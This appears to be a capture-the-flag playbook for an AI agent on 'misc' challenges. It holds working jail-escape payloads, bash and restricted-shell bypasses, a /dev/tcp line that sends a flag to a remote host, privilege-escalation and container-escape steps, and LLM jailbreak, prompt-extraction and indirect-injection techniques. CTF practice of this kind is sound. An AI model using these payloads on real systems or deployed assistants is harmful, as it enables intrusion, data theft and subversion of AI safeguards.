# Skill Module: misc

The grab-bag. "misc" is a filing failure, not a category — almost always a disguised jail escape, weak-PoW/math, esolang rev, shallow steg, privesc/escape, or a scripting drill. First job: name the real sub-type in `notes/ANALYSIS.md`, then work it with the right tool below. Copy the win condition from `../chal_desc.md` **and the live server prompt verbatim** — misc hides the whole task in one sentence ("send the 32-byte SHA256 preimage", "you have 2s", "flag is `/flag.txt`").

## Triage: what you see → what it is

| You see | Sub-type | Go to |
|---|---|---|
| `>>>`, a filtered `eval/exec`, a stripped shell prompt | jail / injection | **Jails** (main event) |
| server leaks the secret only via `L()`/`Q(i,x)`/compare replies | oracle jail | **Oracle jails** |
| a shell you must escalate, `sudo -l`, a container/pod | privesc / escape | **Privesc & escape** |
| server poses a puzzle / PoW, wants a computed reply, loops fast/timed | PoW + interactive | **Script the remote** |
| Brainfuck/Ook/Whitespace/Piet/Malbolge/JSFuck/WASM source, a bytecode blob | esolang / VM | **Esoteric** |
| "solve N boards", Sudoku/maze/nonogram/recurrence, "find the input" | solver puzzle | **Solvers** |
| a nested / unknown encoded blob | encoding | **Encodings** |
| odd-magic file, image, audio, QR photo, IQ capture | shallow steg | **Steg-lite** |
| a `.pkl`/model file, or an LLM/agent to trick | AI / pickle | **AI/ML & pickle** |
| a handle/hash/landmark/domain/DNS zone to chase | OSINT / DNS | **OSINT & DNS** |

Deep carving / memory image / disk / pcap-heavy → it's forensics: borrow `../../skills/forensics.md`. Length-extension / weak-hash / custom-cipher math → `../../skills/crypto.md`.

---

## Jails & sandbox escapes

The bug is a **deviation from a complete blocklist** — read the filter source and find the one char/name/path/AST-node they forgot; that gap is your primitive (record in `notes/VULN.md`). **Probe before crafting:** send test inputs and read the error to map the filter — `name not allowed`=identifier blacklist (→unicode/hex escapes), `unknown function`=whitelist (→brute names `for c in printable`), `node not allowed`=AST filter (→avoid the syntax). The decisive question: **does the filter see the literal or the runtime value?** If it only substring-scans source text (no AST walk), one layer of `dir()`/`getattr`/`vars` indirection defeats it. Reproduce the filter in a `tmp/` scratch file and prove the payload locally before firing remote. Keep the working escape in `solver.py`. Tools: `pyjailbreaker`, MRO/`__subclasses__` gadget lists.

### Pyjail — constraint → bypass

| What blocks you | Bypass |
|---|---|
| `__builtins__` deleted / emptied | walk back to builtins from any object (see cheat block) |
| name blacklist (`os`,`system`,`import`,`eval`,`flag`) | build the string: `'o'+'s'`, `'metsys'[::-1]`, `chr()`, `bytes.fromhex`, `\x6f\x73`; reach attrs with `getattr` |
| source is **substring-scanned** for those names | never type the literal — index it: `getattr([],dir([])[i])` picks `__class__`/`append`/… by position; `dir(x)[n]`, `vars(x)[k]`, `().__dir__()[n]`, `globals().get(k)` |
| `.` (attribute dot) filtered | `getattr(x,'name')`; format-string `{0.__class__}`; `vars(x)`/`__dict__[...]` |
| `_` / dunder filtered | build the name `getattr(x,'__cl'+'ass__')`; `str.format` templates tolerate `_` the raw scan didn't; `\x5f` hex-escape the underscore inside a string |
| quotes filtered | `chr()`, `bytes([...]).decode()`, slice `().__doc__`, f-strings, octal/hex escapes (`'\x6f'`) in any allowed string context |
| identifiers scanned but Unicode passes | NFKC homoglyphs: fullwidth `ｅｖａｌ`→`eval`, `ﬀ`/superscripts fold to the ASCII name the byte-filter never saw. Also a magic encoding comment: `# -*- coding: raw_unicode_escape -*-` then `im...` = `import`; `utf-7`/`rot_13` work too |
| no alphanumerics (symbols only) | ints from nothing: `[]<[]`=0, `{}<[]`=1, `-~x` increments, `<<` shifts, repunit `(10**k-1)//9`; recurse to build any int, then `chr`/`%c` to strings. If the eval decodes your int (`long_to_bytes(eval(x))`), a 2-char `1`/`+` sum-of-repunits reaches arbitrary code |
| `()` **and** `=` **and** quotes filtered | **decorator escape**: `@expr` above `def n():0` runs `n=expr(n)` — implicit call + bind, no `()`/`=`/quotes; stack `@a`/`@b` to compose; get strings from `f.__name__` (a `def foo` yields the string `"foo"` via `type(f).__dict__['__name__'].__get__(f)`) |
| a *constraint variable* gates you | **walrus-reassign** it: `(allowed := '\141\142...')` overwrites the checker's own whitelist with octal-built letters |
| input length-capped | `breakpoint()`; `exec(input())`/`exec(open(0).read())` buys an unbounded next line; set a global on line 1, use it on line 2 |
| multi-round jail, filter resets each round | **persist state**: round 1 stash a gadget on a class attr (`type([]).x=gadget`; or `[].__class__.__base__.__subclasses__()[-2].payload="..."`), retrieve after reset — class attrs live for the whole process |
| audit hook blocks exec/os spawn | try plain `open('/flag').read()` (reads often un-audited); `ctypes` if importable |
| you control an env var / `PYTHON*` | RCE without code: `PYTHONSTARTUP`/`PYTHONINSPECT=1` (drops to shell), `PYTHONPATH` (inject a module), `BROWSER='/bin/sh -c "cat /flag" %s'` then trigger `webbrowser`, `PYTHONWARNINGS=all:0:antigravity.x.0` |
| `eval("prefix."+you+"()")` shape | **tuple injection**: comma breaks the expression — `dig(),__import__('os').system('sh'),` becomes a tuple of evaluated exprs; hex-escape `\x5f` past `_` filters; or store the payload in a name and `eval(name)` |

### Recover a shell / builtins (Python 3; adjust the index)
```python
# builtins back from any function's globals — most reliable, no fixed index:
(lambda:0).__globals__['__builtins__']['__import__']('os').system('sh')
# no lambda? subclasses → catch_warnings → module builtins:
[c for c in ().__class__.__base__.__subclasses__()
   if c.__name__=='catch_warnings'][0]()._module.__builtins__['__import__']('os').system('sh')
# warnings.catch_warnings is almost always loaded; its __init__.__globals__ holds linecache→os:
[c for c in ().__class__.__base__.__subclasses__() if c.__name__=='catch_warnings'][0] \
  .__init__.__globals__['linecache'].__dict__['os'].system('sh')
# __builtins__ EMPTIED to {}: borrow a LIVE one off import machinery —
o=[c for c in ().__class__.__base__.__subclasses__() if c.__name__=='catch_warnings'][0]()
o._module.__loader__.load_module.__func__.__globals__['__builtins__']['__import__']('os').system('sh')
# without the literal "os" / without the import keyword:
getattr(__import__('o'+'s'),'sys'+'tem')('sh')
__import__('subprocess').run('sh',shell=True); __import__('pty').spawn('sh')
breakpoint()                                     # → pdb → shell if BdbQuit isn't trapped
```
`help`/`license`/`exit`/`__loader__`/`__spec__` still carry import-machinery references a blocklist often misses. `f.__code__.co_consts` leaks every string literal defined *inside* a function; `module.__doc__` reads a module-level docstring without file access; `__`-prefixed "private" names are just `_Class__name` — reachable via `dir()`+`getattr`.

### Format-string / SSTI (no code exec, only a template)
```
{0.__class__.__init__.__globals__[os].system}            # "...".format(obj) reaches os
{{ cycler.__init__.__globals__.os.popen('id').read() }}  # Jinja2 SSTI gadget
{{ ''.__class__.__mro__[1].__subclasses__() }}           # enumerate, then index Popen/os-holder
```

### Oracle / mastermind jails
The server never runs your code — it only answers queries about a hidden flag (`L()`=length, `Q(i,x)`=compare pos `i`, mastermind "n correct / m misplaced", or a Levenshtein/edit-distance number). Leak it byte-by-byte in a pwntools loop: **binary-search** each position when `Q` returns `<`/`=`/`>`, else linear-scan `32..127`; for mastermind, probe one char class at a time and lock positions greedily. Never guess — script the leak.

### Non-Python sandboxes
| Lang | Escape |
|---|---|
| Lua | `os.execute`/`io.popen`; if globals nuked, `load`/`loadstring`/`string.dump`; function-name injection when the host concatenates your token into a call |
| Ruby | backticks `` `sh` ``, `%x{}`, `system`; `TracePoint.new(:call){...}.enable` runs code on any call — bypasses method blocklists |
| JS / Node | `this.constructor.constructor('return process')().mainModule.require('child_process')`; `require('child_process').execSync` |
| WASM game/VM | patch behaviour: `wasm2wat`→edit the compare/score (`i64.lt_s`→`gt_s`)→`wat2wasm`; or poke linear memory live in the console |
| custom asm / provided interpreter | that's **rev**: learn the opcode table, then reimplement or drive it (`../../skills/rev.md`) |

### Bashjail — constraint → bypass
Synthesize `$0` (the shell binary → running it spawns a fresh shell) or the exact bytes you need, then read the flag. First detect the eval context: a trailing `\` that errors `unexpected EOF ... matching '"'` means `eval "$in"` (double-quoted) — `\$` gives a literal `$`; bare `eval $in` word-splits instead.

| Constraint | Bypass |
|---|---|
| ≤3 chars/token, only `#`,`$`,`\` in a double-quoted eval | `\$$#` → `\$`=literal `$`, `$#`=`0` → the string `$0` → expands to `bash` → shell. `$$`=PID digits, `${##}`=1 for more numbers |
| no letters at all | ANSI-C octal: `$'\057\142\151\156\057\163\150'`=`/bin/sh`; assign to an all-underscore var `__=$'...'; $__` |
| need a specific letter | slice env vars: `${PATH:0:1}`=`/`, `${HOME:n:1}`, `${IFS}`=space, `${PWD##*/}`, `${OSTYPE:n:1}` |
| echo-only + `(` `)` `+` `=` | arithmetic makes ints from nothing (`a=$((++a))` — unset var is 0), then `$'\NNN'` builds any byte → any command |
| no `cat`/reader | `HISTFILE=/flag bash -i; history`; `bash -v flag` (echoes each "sourced" line, `#flag{...}` prints harmlessly); `mapfile -t x</flag; echo "${x[@]}"`; `read -d '' x</flag; echo "$x"`; `ctypes.sh` `dlcall open/mmap` |
| no `nc`/`curl` | bash builtin socket: `exec 3<>/dev/tcp/HOST/PORT; echo "$(</flag)" >&3`; `cat </dev/tcp/…` inbound |
| **commands run but no output** | stdout/stderr closed — redirect to a still-open fd (stdin *is* the socket): `cat -A flag 1>&0`. Use `cat -A`/`od -c`/`xxd`/`base64` so a `\r` doesn't truncate the display |
| on a socat/nsjail fd | reuse the client socket: `exec <&3; sh >&3 2>&3` (fd usually 3; find via `ls -l /proc/self/fd`) |

### Restricted shell / command injection

| Situation | Move |
|---|---|
| rbash / allowlisted shell | escape via an allowed tool: `vi`→`:!sh`, `less`/`man`/`K`(keyword→`man`→`less`)→`!sh` (only if `LESSSECURE` unset), `awk 'BEGIN{system("sh")}'`, `find . -exec sh \;`, `python3 -c 'import pty;pty.spawn("sh")'`, `env sh` — check GTFOBins for **every** allowed binary |
| rbash allows `VAR=val cmd` prefixes | `LD_PRELOAD=/tmp/hook.so cat` — a `.so` with `__attribute__((constructor))` runs before the allowed binary (argv is filtered, env isn't) |
| flag readable, shell unnecessary | `cat /flag*`, glob it, or read through an allowed interpreter |
| after any shell, flag not on disk | check internal services: `cat /proc/*/cmdline | tr '\0' ' '` for a `socat …EXEC:cat /flag` on localhost; then `cat </dev/tcp/127.0.0.1/PORT` |
| your input is spliced into a shell command | inject `;` `\|` `&&` `$(...)` backticks or newline; spaces→`${IFS}`; `/`→`${PATH:0:1}` |

---

## Privilege escalation & container escape
Only when the challenge hands you a shell and the flag needs more privilege. Enumerate first — `sudo -l`, SUID (`find / -perm -4000`), caps (`getcap -r /`), cron (`pspy`), group membership, mounts, `/proc/*/cmdline`; `linpeas` for a sweep — then pick the primitive.

| Foothold | Escalation |
|---|---|
| `sudo -l` lists a binary | GTFOBins its **sudo** entry (shell / file-read / write primitive as root). Watch secondary flags: `file -m /root/` dir-lists via error, `tar --to-command`, `awk -f`, `find -exec` |
| sudo rule with a wildcard (`tar cf - *`) | fnmatch argument injection: create files named `--checkpoint=1 --checkpoint-action=exec=sh`; `*` matches across spaces (no `FNM_PATHNAME`), so one glob absorbs many injected flags |
| sudo rule over a glob path | glob+symlink confused-deputy: name a matched path a symlink to the target — sudo matches the *string*, the binary `open()`s the *link* |
| SUID binary / writable cron / relative PATH in root script | GTFOBins **SUID** column; hijack the relative binary a root job calls; drop a SUID copy into a dir a root cronjob chowns |
| a root script `pgrep`s a cmdline and re-runs it | spoof a process with injected flags: `perl -e '$0="…-d /tmp/evil";sleep 300'&` |
| `stat`/`access` **then** `open` on a path | TOCTOU race: two tight loops — one flips a symlink dummy↔`/flag`, the other hammers the checker; `renameat2(RENAME_EXCHANGE)` to tighten |
| in `docker`/`sudo`/`disk` group | instant root: docker group → `docker run -v /:/host …; chroot /host sh` |
| `docker.sock` reachable | `docker run -v /:/host --privileged … chroot /host sh` |
| container is `--privileged` | mount the host disk + `chroot`, or `nsenter -t 1 -m -u -i -n -p sh` |
| `CAP_SYS_ADMIN` w/o privileged | cgroup-v1 `release_agent` escape → script fires on the host |
| PostgreSQL superuser | `COPY(SELECT'')TO PROGRAM 'sh -c …'` = RCE; `SELECT pg_read_file('/flag')` to just read |
| Kubernetes pod | `/var/run/secrets/kubernetes.io/serviceaccount/token` → `kubectl auth can-i --list`; abuse any allowed verb to read secrets / `exec` |

---

## Script the remote (PoW & interactive protocols)

Never answer a prompting server by hand — a 2s timer beats manual netcat. **Each `bash` call is a fresh process**, so for any stateful service write a pwntools/socket script (keep it as `solver.py`), never chain `nc` calls; for a raw binary over `nc` use `stty raw -echo`. Do all math in code. Develop with `context.log_level="debug"` until the byte-for-byte dialog is right, then silence it. On a failed round, print the exact bytes received — never guess the protocol. When a primitive lands (jail shell, PoW passed, frame decoded), collapse connect→flag into a deterministic `solver.py`.

**Solve any PoW gate first.** Two common shapes:
```python
import hashlib, itertools
def solve_bits(prefix: bytes, nbits: int, alg="sha256") -> bytes:   # N leading zero BITS
    for i in itertools.count():
        s = str(i).encode()
        if int.from_bytes(hashlib.new(alg, prefix+s).digest(),"big") >> (256-nbits) == 0:
            return s
def solve_zeros(prefix: bytes, nzeros: int, alg="sha256") -> bytes:  # hex digest starts N '0' nibbles
    for i in itertools.count():
        s = str(i).encode()
        if hashlib.new(alg, prefix+s).hexdigest().startswith("0"*nzeros):
            return s
```
Match the exact wording: some hash `S+prefix`, want hex/the digest, or a different order. redpwn/kctf `pow.py` (`s.AAA… ...`): don't reimplement — run `curl -sSfL https://pwn.red/pow | sh -s <challenge>` or `pip install pow; pow <challenge>`. Timed arithmetic gauntlet → parse the expression and `ast.literal_eval`/safe-eval it.

```python
from pwn import *
from hashlib import sha256
from itertools import count

io = remote("chal.host", 1337)          # host/port from ../chal_desc.md
# context.log_level = "debug"           # while developing

io.recvuntil(b"prefix: "); prefix = io.recvline().strip()
for n in count():                       # PoW: find suffix so sha256 has 5 hex zeros
    cand = f"{n}".encode()
    if sha256(prefix + cand).hexdigest().startswith("00000"):
        io.sendlineafter(b"suffix: ", cand); break

while True:                             # then loop the real protocol
    line = io.recvline(timeout=5)
    if not line: break
    if b"?" in line:
        io.sendline(str(eval(line.split(b"=")[0])).encode())   # parse precisely, don't guess
    if b"CTF{" in line: log.success(line.decode(errors="replace"))
io.close()
```

---

## Esoteric languages / VMs
Recognize on sight: Brainfuck (`+-<>[].,` — themed variants map words/emoji to the 8 ops, most-frequent token is usually `+`/`-`, line-ender `.`), Ook! (`Ook.`), Whitespace (only space/tab/newline — `cat -A`), Piet (color-block image → `npiet prog.png` / `PietDev.jar`), JSFuck (`[]()!+` → paste into `node`), Malbolge (line noise → use a generator, don't write it), base65536/CJK, XSLT-as-VM. **Run it, never hand-trace** — grab an interpreter or write a 30-line one, feed program + stdin, capture stdout. Watch for polyglots/multi-layer (BF that prints a Piet URL, Piet→base64→Malbolge). A `.pyc`/marshal/PyInstaller blob → `pycdc`/`uncompyle6`, `pyinstxtractor`; a **custom** VM with a provided interpreter is rev — learn the opcodes.

## Solver puzzles (logic / constraint / programming)
"Solve N rounds of <puzzle>", Sudoku/nonogram/maze/graph, "find input satisfying these equations" → write a solver wired into the pwntools loop; parse each round with regex, solve, reply, repeat. Pick the hammer: `z3-solver`/`cvc5` for constraints/SAT/SMT and reversing checks (race N seeds, don't parallelize one), OR-Tools CP-SAT (scales with cores) for scheduling/packing, BFS/DFS/`networkx` for mazes/graphs, brute force only when the space is provably tiny. Patterns worth spotting: **De Bruijn sequence** to cover every N-symbol code in one stream (PIN/keypad brute), **matrix exponentiation** for a huge-index linear recurrence, **OEIS lookup** for an unknown integer sequence, nonogram→bitmap→QR pipelines.
```python
from z3 import *
s=Solver(); x=[Int(f"x{i}") for i in range(9)]
s.add([And(v>=1,v<=9) for v in x]); s.add(Distinct(x))
print(s.model() if s.check()==sat else "unsat")
```

## Encodings — decode, don't guess
| Signal | Decode |
|---|---|
| unknown blob that peels into another blob | auto-decoder loop: try base64/32/16, hex, url, zlib/gzip, rot13/47 each round and recurse on every printable result until the flag surfaces (CyberChef "Magic" or a 20-line Python loop) |
| all chars `[0-9a-f]`, even length | **decode HEX FIRST, then base64** — the common `hex(base64(flag))` nesting; base64-first silently produces garbage |
| `A-Z2-7=` only | base32; `A-Za-z0-9+/=` → base64; digits-only in fixed-width groups → BCD, or ASCII codepoints |
| groups of 4 (or 8) ASCII bytes per value | IEEE-754: `struct.unpack('>f'/'>d', bytes)` — floats used as a data-hiding carrier |
| text is mojibake / byte-swapped | UTF-16 endianness flip: re-decode `utf-16-le`↔`utf-16-be` (`b.decode('utf-16-le')` vs `-be`) |
| space/tab/newline only; `.png` renders nothing; `[]()!+` soup | esolang → **Esoteric** |
| a photo/scan of a code | `zbarimg`/`pyzbar` → **Steg-lite** |

## Steg-lite, QR & barcodes
Identify before poking: `file`, `binwalk`, `exiftool`, `strings -n8`; check tail bytes for appended archives / magic mismatches (a "png" that's really a zip). Images: LSB (`zsteg -a` PNG/BMP, plane views in `stegsolve`), palette tricks, faked `IHDR` height hiding rows, `steghide`/`stegseek` (JPG+passphrase). Audio: spectrogram (`sox`/`ffmpeg`, Sonic Visualiser), DTMF/POCSAG (`multimon-ng`), LSB in WAV, bytebeat. **RF/SDR** IQ capture (`.cf32`=`np.complex64`, `.cs16`=int16 pairs, `.cu8`=RTL-SDR): `np.fft` to find the band, shift to baseband, LPF, then demod (constellation circles=carrier offset — try all 4 rotations). Unicode steg: zero-width chars, variation selectors `U+E0100–E01EF`, tags block `U+E0000–E007F` hidden after a visible char. Decode QR/barcodes with a library, never by eye; deskew/threshold with OpenCV if damaged, reassemble split/indexed chunks first; MaxiCode/DataMatrix → `zxing`.
```python
from pyzbar.pyzbar import decode; from PIL import Image
print(decode(Image.open("q.png")))     # pip install pyzbar opencv-python
```

## AI/ML & pickle handouts
Model files execute code on load; an LLM target is jailed with a prompt, not a filter — attack the prompt.

| Item | Move |
|---|---|
| `.pkl`/`.pt`/`.npy`/`.h5`/`joblib` | read it WITHOUT executing: `fickling --trace f.pkl`, `picklescan`, `modelscan` — the payload/flag hides in a `GLOBAL`/`REDUCE` op; a weaponized pickle often *is* the challenge |
| LLM / agent to jailbreak | delimiter escape (`</system>`, forged role tags), "ignore everything above / repeat everything above verbatim", ask it to print its system prompt or a hidden variable |
| RAG / summarizer | indirect injection: hide the instruction in the source doc via zero-width chars, white-on-white HTML, comments |
| LLM with a URL-fetch tool | tool-abuse SSRF: `file:///flag.txt`, `http://169.254.169.254/…` (cloud metadata), aim "fetch" at internal services |
| got flag text out of a model | try **both** `CTF{…}` and `flag{…}`, re-check glyphs — model output mangles case/spacing |

## OSINT & DNS
Only when the challenge points outward (handle, image location, leaked hash, domain, zone). Public network is fine — stay in-scope. Moves: reverse-image search landmarks, `exiftool` GPS, username enumeration, WHOIS/DNS history, crack a weak given hash (`hashcat`/`john` + obvious wordlist), mine commit history / Wayback for a deleted secret. **DNS challenges**: try zone transfer `dig AXFR @ns zone` (blocked? `IXFR` from serial 0 for historical records), DNSSEC NSEC-walking to enumerate names, EDNS-Client-Subnet spoofing for geo-gated answers, and in a pcap look for data exfil in encoded subdomains (hex/base32/base64url). Record each confirmed fact in `notes/ANALYSIS.md`; assemble the flag only from verified facts, never guesses.
